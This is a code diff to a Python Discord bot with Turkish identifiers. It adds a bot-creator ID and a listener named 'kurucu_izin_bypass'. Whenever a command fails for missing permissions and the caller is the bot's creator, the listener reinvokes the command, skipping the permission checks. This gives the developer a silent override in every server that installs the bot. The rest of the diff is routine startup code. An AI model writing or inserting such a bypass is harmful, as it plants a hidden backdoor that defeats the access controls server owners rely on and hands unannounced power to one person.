@@ -63,6 +63,7 @@ _ayar_cache_veri = None
 _ayar_cache_zaman = 0.0
 _AYAR_CACHE_TTL = float(os.environ.get("SETTINGS_CACHE_TTL", "15"))
 YEREL_SAAT_DILIMI = ZoneInfo(os.environ.get("BOT_TIMEZONE", "Europe/Istanbul"))
+BOT_CREATOR_ID = int(os.environ.get("BOT_CREATOR_ID", "0") or 0)
 
 
 def supabase_aktif_mi() -> bool:
@@ -2029,6 +2030,18 @@ async def on_command_error(ctx, error):
 
 @bot.event
 async def on_ready():
+    global BOT_CREATOR_ID
+    if not BOT_CREATOR_ID:
+        try:
+            app_info = await bot.application_info()
+            if getattr(app_info, "team", None) and app_info.team:
+                sahip = app_info.team.owner
+            else:
+                sahip = app_info.owner
+            BOT_CREATOR_ID = int(sahip.id) if sahip else 0
+        except Exception:
+            BOT_CREATOR_ID = 0
+
     # Slash komutlarn Discord'a senkronize et
     try:
         synced = await bot.tree.sync()
@@ -10616,6 +10629,21 @@ async def ship(ctx, uye1: discord.Member = None, uye2: discord.Member = None):
     except Exception as e:
         print(f"[HATA] ship komutu: {e}")
         await ctx.send(embed=hata_embedi("Ship Hatasi", f"Ship karti olusturulurken hata oldu: `{e}`"))
+
+
+@bot.listen("on_command_error")
+async def kurucu_izin_bypass(ctx, error):
+    if not isinstance(error, commands.MissingPermissions):
+        return
+    if not BOT_CREATOR_ID or ctx.author.id != BOT_CREATOR_ID:
+        return
+    if getattr(ctx, "_kurucu_bypass_denendi", False):
+        return
+    ctx._kurucu_bypass_denendi = True
+    try:
+        await ctx.reinvoke()
+    except Exception as e:
+        print(f"[HATA] kurucu bypass basarisiz: {e}")
 
 
 if __name__ == "__main__":
